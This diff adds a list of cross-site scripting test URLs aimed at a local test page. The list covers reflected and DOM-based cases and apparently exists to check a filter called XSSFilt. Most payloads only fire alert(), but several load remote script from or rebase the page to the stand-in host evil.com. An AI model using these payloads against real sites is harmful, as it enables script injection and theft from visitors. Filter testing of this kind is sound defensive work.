@@ -1,0 +1,29 @@
+Reflected:
+
+-Inline
+http://localhost/dom-xss/test/reflected.php?body=<script>alert(1)</script>
+http://localhost/dom-xss/test/reflected.php?body=<img src="fsgf" onerror="alert(1)"/>
+http://localhost/dom-xss/test/reflected.php?body=<a href="javascript:alert(1)">click</a>
+http://localhost/dom-xss/test/reflected.php?body=<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="></object>
+http://localhost/dom-xss/test/reflected.php?eval=alert('XSS')
+http://localhost/dom-xss/test/reflected.php?setTimeout=alert('XSS')
+http://localhost/dom-xss/test/reflected.php?function=alert('XSS')
+-External
+http://localhost/dom-xss/test/reflected.php?body=<script src="http://evil.com/xss.js"></script>
+http://localhost/dom-xss/test/reflected.php?head=<base href="http://evil.com/" />
+http://localhost/dom-xss/test/reflected.php?body=<object type="text/x-scriptlet" data="http://evil.com/xss.js">
+
+DOM-Based:
+
+http://localhost/dom-xss/test/dombased.php?sink=eval#alert('xss');
+http://localhost/dom-xss/test/dombased.php?sink=function#alert('xss');
+http://localhost/dom-xss/test/dombased.php?sink=setTimeout#alert('xss');
+http://localhost/dom-xss/test/dombased.php?sink=scriptSrc#http://evil.com/xss.js
+http://localhost/dom-xss/test/dombased.php?sink=scriptText#alert("XSS")
+http://localhost/dom-xss/test/dombased.php?sink=location#javascript:alert("XSS")
+http://localhost/dom-xss/test/dombased.php?sink=lochref#javascript:alert(1)
+http://localhost/dom-xss/test/dombased.php?sink=docwrite#<script>alert("xss")</script>
+http://localhost/dom-xss/test/dombased.php?sink=innerHTML#<img src="http://sdfgofgd.net/" onerror="alert(1)">
+
+
+All covered in XSSFilt.
